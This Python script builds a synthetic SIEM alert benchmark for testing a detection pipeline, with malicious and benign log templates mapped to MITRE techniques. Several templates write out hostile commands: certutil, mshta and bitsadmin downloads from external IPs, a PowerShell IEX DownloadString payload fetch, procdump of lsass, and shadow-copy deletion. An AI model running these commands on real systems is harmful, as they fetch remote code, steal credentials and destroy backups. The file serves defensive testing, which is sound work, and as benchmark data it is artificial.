"""Generate 515-alert benchmark corpus for v3 pipeline testing."""
import json
import random
import hashlib

random.seed(42)  # Reproducible

EXTERNAL_IPS = [
    "185.220.101.45", "45.33.32.156", "91.240.118.172", "5.188.86.25",
    "171.25.193.78", "62.102.148.69", "185.56.83.83", "193.142.146.35",
    "46.166.139.111", "198.98.56.149", "103.224.182.244", "178.128.23.9",
]
INTERNAL_IPS = [
    "10.0.0.{}".format(i) for i in range(1, 50)
] + [
    "192.168.1.{}".format(i) for i in range(1, 30)
] + [
    "172.16.0.{}".format(i) for i in range(1, 20)
]
USERNAMES = [
    "root", "admin", "j.smith", "m.jones", "d.wilson", "a.brown",
    "svc_sql", "svc_backup", "svc_web", "operator", "guest",
    "finance_user", "hr_admin", "devops", "contractor1",
]
HOSTNAMES = [
    "DC-01", "DC-02", "WS-001", "WS-042", "SRV-DB01", "SRV-WEB03",
    "LAPTOP-A7F3", "KIOSK-LOBBY", "PRINTER-3F",
]

ATTACK_PLANS = {
    "brute_force": {
        "malicious_templates": [
            "500 failed attempts for {user} from {ext_ip} EventID=4625 TargetUserName={user} ssh2",
            "EventID=4625 {count} login failures from {ext_ip} TargetUserName={user} LogonType=10 SubStatus=0xC000006A",
            "Failed password for {user} from {ext_ip} port 22 ssh2 repeated {count} times",
        ],
        "benign_templates": [
            "EventID=4625 2 failed login for {user} from {int_ip} TargetUserName={user} LogonType=2",
            "Failed password for {user} from {int_ip} port 22 ssh2 (mistyped password)",
        ],
        "mitre": "T1110",
    },
    "kerberoasting": {
        "malicious_templates": [
            "EventID=4769 TicketEncryptionType=0x17 ServiceName=MSSQLSvc/{host}:1433 TargetUserName={user} ClientAddress={int_ip} Status=0x0",
            "EventID=4769 TicketEncryptionType=0x17 ServiceName=HTTP/{host} TargetUserName={user} ClientAddress={int_ip}",
        ],
        "benign_templates": [
            "EventID=4769 TicketEncryptionType=0x12 ServiceName=krbtgt/CORP.LOCAL TargetUserName={user} ClientAddress={int_ip} Status=0x0",
        ],
        "mitre": "T1558.003",
    },
    "golden_ticket": {
        "malicious_templates": [
            "EventID=4768 TicketEncryptionType=0x17 ServiceName=krbtgt/CORP.LOCAL TicketOptions=0x50800000 Lifetime=87600h ClientAddress={int_ip} TargetUserName={user}",
        ],
        "benign_templates": [
            "EventID=4768 TicketEncryptionType=0x12 ServiceName=krbtgt/CORP.LOCAL Status=0x0 ClientAddress={int_ip}",
        ],
        "mitre": "T1558.001",
    },
    "phishing_investigation": {
        "malicious_templates": [
            "Subject: URGENT wire transfer URL: http://secure-login-{host}.com/verify From: ceo@company-portal.com To: {user}@company.com",
            "Subject: Your account will be suspended URL: http://portal-verify.net/login?id={user} attachment: invoice.pdf.exe From: support@{host}-services.com",
        ],
        "benign_templates": [
            "Subject: Weekly team meeting From: manager@company.com To: {user}@company.com",
            "Subject: Q4 report attached From: finance@company.com To: {user}@company.com",
        ],
        "mitre": "T1566",
    },
    "ransomware_triage": {
        "malicious_templates": [
            "vssadmin delete shadows /all /quiet detected from {host} mass file encryption .locked extension User={user}",
            "wmic shadowcopy delete from {host} followed by mass .encrypted extension changes on shares User={user}",
        ],
        "benign_templates": [
            "Backup completed successfully on {host} User={user} volume shadow copy created",
        ],
        "mitre": "T1486",
    },
    "data_exfiltration_detection": {
        "malicious_templates": [
            "1.5GB transferred to {ext_ip} via HTTPS at 02:30 off-hours encrypted from {user} host {host}",
            "Large upload 800MB to external cloud storage from {user} at {host} encoded base64 off-hours",
        ],
        "benign_templates": [
            "50KB config uploaded to internal share from {user} at {host}",
            "Daily backup 2GB to authorized storage from svc_backup at {host} at 03:00",
        ],
        "mitre": "T1048",
    },
    "lateral_movement_detection": {
        "malicious_templates": [
            "PsExec service installed on {host} from {int_ip} User={user} cmd.exe /c whoami",
            "WMI remote process creation on {host} from {int_ip} User={user} powershell.exe -enc",
        ],
        "benign_templates": [
            "RDP session from {int_ip} to {host} User={user} during business hours",
        ],
        "mitre": "T1021",
    },
    "c2_communication_hunt": {
        "malicious_templates": [
            "Beacon interval 30s to {ext_ip}:443 DGA domain xk7f2m.evil.net connections=500 stddev=0.3 from {host}",
            "Regular HTTPS connections every 60s to {ext_ip}:8443 from {host} User={user} connections=200 stddev=1.2",
        ],
        "benign_templates": [
            "HTTPS to www.microsoft.com from {host} normal update check",
        ],
        "mitre": "T1071",
    },
    "privilege_escalation_hunt": {
        "malicious_templates": [
            "EventID=4672 Special privileges assigned to {user} from {host} SeDebugPrivilege SeImpersonatePrivilege",
            "sudo -u root /bin/bash from {user} at {host} via SSH from {int_ip}",
        ],
        "benign_templates": [
            "EventID=4672 Standard admin logon for {user} at {host}",
        ],
        "mitre": "T1548",
    },
    "insider_threat_detection": {
        "malicious_templates": [
            "Bulk file access 5000 files from {user} at {host} off-hours 23:45 to finance share staging area",
            "USB device mounted on {host} by {user} at 01:00 followed by 2GB copy to removable media",
        ],
        "benign_templates": [
            "Normal file access by {user} at {host} during business hours 10 files",
        ],
        "mitre": "T1056",
    },
    "network_beaconing": {
        "malicious_templates": [
            "DNS beacon to {ext_ip} every 30s from {host} high entropy subdomain a8f3k2.evil.net connections=1000",
            "HTTP beacon interval=60s to {ext_ip}:80 from {host} fixed payload size 256 bytes stddev=0.5",
        ],
        "benign_templates": [
            "NTP sync to time.windows.com from {host} every 3600s",
        ],
        "mitre": "T1071.004",
    },
    "cloud_infrastructure_attack": {
        "malicious_templates": [
            "CloudTrail: DeleteTrail by {user} from {ext_ip} followed by CreateAccessKey and AssumeRole",
            "IAM policy change by {user} from {ext_ip}: AdministratorAccess attached to new role",
        ],
        "benign_templates": [
            "CloudTrail: DescribeInstances by {user} from {int_ip} routine monitoring",
        ],
        "mitre": "T1078",
    },
    "supply_chain_compromise": {
        "malicious_templates": [
            "Package hash mismatch: expected sha256=abc123 got sha256=def456 for dependency from {host} installed by {user}",
            "Typosquatted package 'reqeusts' installed on {host} by {user} from PyPI",
        ],
        "benign_templates": [
            "Package update: numpy 1.24.0 -> 1.25.0 on {host} by {user} hash verified",
        ],
        "mitre": "T1195",
    },
    "dcsync": {
        "malicious_templates": [
            "EventID=4662 Directory replication request from {int_ip} by {user} non-DC source targeting KRBTGT",
            "DRS GetNCChanges from {host} ({int_ip}) to DC-01 User={user} replicating password hashes",
        ],
        "benign_templates": [
            "EventID=4662 Normal AD replication between DC-01 and DC-02",
        ],
        "mitre": "T1003.006",
    },
    "dll_sideloading": {
        "malicious_templates": [
            "Unsigned DLL loaded: C:\\Users\\{user}\\AppData\\Local\\Temp\\malware.dll by legitimate process on {host}",
            "DLL side-load detected: version.dll in C:\\ProgramData\\UpdateService\\ loaded by updater.exe on {host}",
        ],
        "benign_templates": [
            "DLL loaded: C:\\Windows\\System32\\kernel32.dll by explorer.exe on {host}",
        ],
        "mitre": "T1574.002",
    },
    "lolbin_abuse": {
        "malicious_templates": [
            "certutil -urlcache -split -f http://{ext_ip}/payload.bin C:\\Temp\\update.exe on {host} User={user}",
            "mshta http://{ext_ip}/evil.hta executed on {host} by {user}",
            "bitsadmin /transfer dl http://{ext_ip}/mal.exe C:\\Temp\\svc.exe on {host} User={user}",
        ],
        "benign_templates": [
            "certutil -verify certificate.cer on {host} by {user}",
        ],
        "mitre": "T1218",
    },
    "process_injection": {
        "malicious_templates": [
            "CreateRemoteThread into lsass.exe from {host} PID=4532 by {user} source process: unknown.exe",
            "NtWriteVirtualMemory targeting explorer.exe from suspicious process on {host} User={user}",
        ],
        "benign_templates": [
            "Standard DLL injection by antivirus scanner on {host}",
        ],
        "mitre": "T1055",
    },
    "wmi_lateral": {
        "malicious_templates": [
            "WMI remote process creation: powershell.exe on {host} from {int_ip} User={user} Win32_Process.Create",
            "WMIC /node:{host} process call create cmd.exe from {int_ip} User={user}",
        ],
        "benign_templates": [
            "WMI query Win32_OperatingSystem on {host} from management server {int_ip}",
        ],
        "mitre": "T1047",
    },
    "rdp_tunneling": {
        "malicious_templates": [
            "SSH tunnel established {int_ip}:3389 -> {ext_ip}:443 from {host} User={user} unusual RDP port",
            "RDP connection to {host} via port 8443 from {int_ip} SSH tunnel detected User={user}",
        ],
        "benign_templates": [
            "Standard RDP session to {host} from {int_ip} port 3389 User={user} business hours",
        ],
        "mitre": "T1021.001",
    },
    "dns_exfiltration": {
        "malicious_templates": [
            "High-entropy DNS queries: aGVsbG8.evil-cdn.net from {host} QueryType=TXT ResponseSize=4096 {int_ip}",
            "DNS tunnel detected: 500 TXT queries to data.{ext_ip}.evil.net from {host} encoded payloads",
        ],
        "benign_templates": [
            "DNS query www.google.com from {host} A record normal browsing",
        ],
        "mitre": "T1071.004",
    },
    "powershell_obfuscation": {
        "malicious_templates": [
            "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA on {host} User={user} from {int_ip}",
            "powershell IEX (New-Object Net.WebClient).DownloadString('http://{ext_ip}/payload.ps1') on {host}",
        ],
        "benign_templates": [
            "powershell Get-Process on {host} User={user} standard admin task",
        ],
        "mitre": "T1059.001",
    },
    "credential_access": {
        "malicious_templates": [
            "EventID=4648 Explicit credential use by {user} from {host} to access {int_ip} TargetServer=DC-01",
            "Credential dumping attempt: procdump.exe -ma lsass.exe on {host} by {user}",
        ],
        "benign_templates": [
            "EventID=4648 Service account {user} authenticating to scheduled task on {host}",
        ],
        "mitre": "T1003",
    },
    "api_key_abuse": {
        "malicious_templates": [
            "API key K-{hash8} used from {ext_ip} after hours accessing admin endpoints User={user}",
            "Excessive API calls 5000/min from {ext_ip} using key belonging to {user}",
        ],
        "benign_templates": [
            "API key used from {int_ip} during business hours normal rate User={user}",
        ],
        "mitre": "T1078",
    },
}

BENIGN_TASK_TYPES = [
    "password_change", "windows_update", "health_check", "cert_renewal",
    "backup_job", "log_rotation", "scheduled_task", "software_update",
    "user_login", "service_restart",
]

BENIGN_RAW_LOGS = [
    "EventID=4724 Status=Success User={user} password changed on {host}",
    "Windows Update KB5034441 installed on {host} by SYSTEM",
    "Health check passed on {host} all services running",
    "Certificate renewed for {host}.corp.local by {user}",
    "Backup job completed successfully on {host} 50GB archived",
    "Log rotation completed on {host} /var/log/syslog rotated",
    "Scheduled task 'DailyReport' executed on {host} by {user} exit code 0",
    "Software update: Chrome 122.0 -> 123.0 on {host} by {user}",
    "Successful login for {user} from {int_ip} to {host} LogonType=2 business hours",
    "Service 'nginx' restarted on {host} by {user} during maintenance window",
]

NOVEL_TASK_TYPES = [
    "memory_forensics", "firmware_tampering", "bluetooth_attack",
    "usb_rubber_ducky", "bios_rootkit", "gpu_keylogger",
    "satellite_intercept", "quantum_crypto_break", "ai_model_poisoning",
    "smart_building_hack", "medical_device_exploit",
]

NOVEL_RAW_LOGS = [
    "Anomalous memory pattern in kernel space from {host} PID=0 suspicious page table modification User={user}",
    "Firmware checksum mismatch on {host} BIOS version changed without authorized update User={user}",
    "Bluetooth Low Energy beacon spoofing detected near {host} targeting User={user} device",
    "USB HID device emulating keyboard detected on {host} rapid keystroke injection User={user} from {ext_ip}",
    "BIOS integrity check failed on {host} unexpected SMM handler modification",
    "Unusual GPU memory access pattern on {host} potential keylogger in shader code User={user}",
    "Unusual satellite communication pattern from {host} uplink to {ext_ip}",
    "Quantum computing anomaly: RSA-2048 factored faster than expected targeting {host}",
    "ML model weights modified on {host} by {user} from {ext_ip} potential backdoor injection",
    "Building management system command from {ext_ip} targeting HVAC on {host} User={user}",
    "Infusion pump firmware update from unauthorized source {ext_ip} on {host}",
]


def gen_hash8():
    return hashlib.md5(str(random.random()).encode()).hexdigest()[:8]


def fill_template(template, is_malicious=True):
    return template.format(
        user=random.choice(USERNAMES),
        ext_ip=random.choice(EXTERNAL_IPS),
        int_ip=random.choice(INTERNAL_IPS),
        host=random.choice(HOSTNAMES),
        count=random.randint(100, 5000),
        hash8=gen_hash8(),
    )


def generate_corpus():
    alerts = []

    # 23 attack plan types x 20 alerts each = 460 (exclude benign_system_event)
    attack_types = [k for k in ATTACK_PLANS.keys()]
    for task_type in attack_types:
        templates = ATTACK_PLANS[task_type]
        mal_templates = templates["malicious_templates"]
        ben_templates = templates["benign_templates"]

        for i in range(20):
            if i < 14:  # 14 malicious
                raw_log = fill_template(random.choice(mal_templates), True)
                expected = "attack"
                severity = random.choice(["high", "critical"])
            else:  # 6 benign
                raw_log = fill_template(random.choice(ben_templates), False)
                expected = "benign"
                severity = random.choice(["low", "medium"])

            src_ip = random.choice(EXTERNAL_IPS if expected == "attack" else INTERNAL_IPS)
            alerts.append({
                "task_type": task_type,
                "expected": expected,
                "input": {
                    "prompt": f"benchmark {task_type} #{i}",
                    "severity": severity,
                    "siem_event": {
                        "title": f"{task_type.replace('_', ' ').title()} #{i}",
                        "source_ip": src_ip,
                        "username": random.choice(USERNAMES),
                        "hostname": random.choice(HOSTNAMES),
                        "rule_name": task_type.replace("_", "").title(),
                        "raw_log": raw_log,
                    },
                },
            })

    # 10 benign task types x 2 alerts each = 20 (all benign)
    for task_type in BENIGN_TASK_TYPES:
        for i in range(2):
            raw_log = fill_template(random.choice(BENIGN_RAW_LOGS), False)
            alerts.append({
                "task_type": task_type,
                "expected": "benign",
                "input": {
                    "prompt": f"benchmark {task_type} #{i}",
                    "severity": "low",
                    "siem_event": {
                        "title": f"{task_type.replace('_', ' ').title()} #{i}",
                        "source_ip": random.choice(INTERNAL_IPS),
                        "username": random.choice(USERNAMES),
                        "hostname": random.choice(HOSTNAMES),
                        "rule_name": task_type.replace("_", " ").title(),
                        "raw_log": raw_log,
                    },
                },
            })

    # 35 novel alerts (no saved plan — will hit Path C or generic)
    for i in range(35):
        task_type = random.choice(NOVEL_TASK_TYPES)
        raw_log = fill_template(random.choice(NOVEL_RAW_LOGS), True)
        alerts.append({
            "task_type": task_type,
            "expected": "attack",
            "input": {
                "prompt": f"benchmark novel {task_type} #{i}",
                "severity": random.choice(["high", "critical"]),
                "siem_event": {
                    "title": f"Novel: {task_type.replace('_', ' ').title()} #{i}",
                    "source_ip": random.choice(EXTERNAL_IPS),
                    "username": random.choice(USERNAMES),
                    "hostname": random.choice(HOSTNAMES),
                    "rule_name": f"Novel{task_type.title().replace('_', '')}",
                    "raw_log": raw_log,
                },
            },
        })

    random.shuffle(alerts)
    return alerts


if __name__ == "__main__":
    corpus = generate_corpus()
    print(f"Generated {len(corpus)} alerts")

    # Count by type
    from collections import Counter
    types = Counter(a["task_type"] for a in corpus)
    expected = Counter(a["expected"] for a in corpus)
    print(f"Expected: {dict(expected)}")
    print(f"Unique task types: {len(types)}")

    with open("tests/benchmark/alert_corpus.json", "w") as f:
        json.dump(corpus, f, indent=2)
    print("Saved to tests/benchmark/alert_corpus.json")
